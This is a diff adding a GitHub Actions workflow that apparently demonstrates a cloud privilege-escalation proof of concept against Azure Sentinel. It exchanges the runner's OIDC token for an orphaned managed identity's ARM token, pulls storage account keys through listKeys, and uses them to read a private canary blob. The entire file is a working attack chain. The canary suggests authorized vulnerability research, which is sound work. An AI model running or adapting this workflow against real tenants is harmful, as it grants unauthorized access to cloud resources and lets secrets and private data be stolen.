@@ -1,0 +1,45 @@
+name: escredeem
+on: [workflow_dispatch]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  redeem:
+    runs-on: ubuntu-latest
+    env:
+      CLIENT_ID: ${{ secrets.AZURE_SENTINEL_CLIENTID_BA9ACC1504454285A0F64B92DCCD9637 }}
+      TENANT_ID: ${{ secrets.AZURE_SENTINEL_TENANTID_BA9ACC1504454285A0F64B92DCCD9637 }}
+      SUB_ID: ${{ secrets.AZURE_SENTINEL_SUBSCRIPTIONID_BA9ACC1504454285A0F64B92DCCD9637 }}
+      STOR: stor6a7c4d8158faf
+      RG: 6a7c4d8158faf772cc8af8ef-rg
+    steps:
+      - name: credential-free redemption of orphaned Sentinel MI
+        run: |
+          set +e
+          echo "=== NO azure/login, NO Azure credential/secret is used below ==="
+          echo "identifiers come from repo Actions secrets (client/tenant/sub) that Sentinel pushed:"
+          echo "  CLIENT_ID present: $([ -n \"$CLIENT_ID\" ] && echo yes)"
+          echo "  TENANT_ID present: $([ -n \"$TENANT_ID\" ] && echo yes)"
+          # 1) GitHub Actions OIDC token
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "OIDC_SUB=$(echo $OIDC | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+=chr(61)*(-len(s)%4);print(json.loads(base64.urlsafe_b64decode(s))[\"sub\"])')"
+          # 2) exchange OIDC assertion for the UAMI ARM token
+          RESP=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
+            -d "grant_type=client_credentials" -d "client_id=$CLIENT_ID" \
+            -d "scope=https://management.azure.com/.default" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            --data-urlencode "client_assertion=$OIDC")
+          ARM=$(echo "$RESP" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))')
+          if [ -z "$ARM" ]; then echo "EXCHANGE_FAILED=$(echo "$RESP" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("error"),str(d.get("error_description"))[:160])')"; exit 0; fi
+          echo "ARM_TOKEN_CLAIMS=$(echo $ARM | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+=chr(61)*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print(\"oid=\"+str(d.get(\"oid\"))+\" appid=\"+str(d.get(\"appid\"))+\" aud=\"+str(d.get(\"aud\")))')"
+          # 3) listKeys on the Sentinel-unrelated storage account (Logic App Contributor)
+          KEYS=$(curl -s -X POST "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$STOR/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $ARM" -H "Content-Length: 0")
+          echo "LISTKEYS_PERMISSIONS=$(echo "$KEYS" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([k[\"permissions\"] for k in d[\"keys\"]] if \"keys\" in d else d)')"
+          KEY=$(echo "$KEYS" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["keys"][0]["value"] if "keys" in d else "")')
+          echo "::add-mask::$KEY"
+          # 4) use the recovered account key to read the private canary blob
+          if [ -n "$KEY" ]; then
+            az storage blob download --account-name "$STOR" --account-key "$KEY" -c canary -n canary.txt -f /tmp/c.txt --only-show-errors >/dev/null 2>&1
+            echo "CANARY_BLOB_CONTENT=$(cat /tmp/c.txt 2>/dev/null)"
+          fi
+          echo "=== done ==="
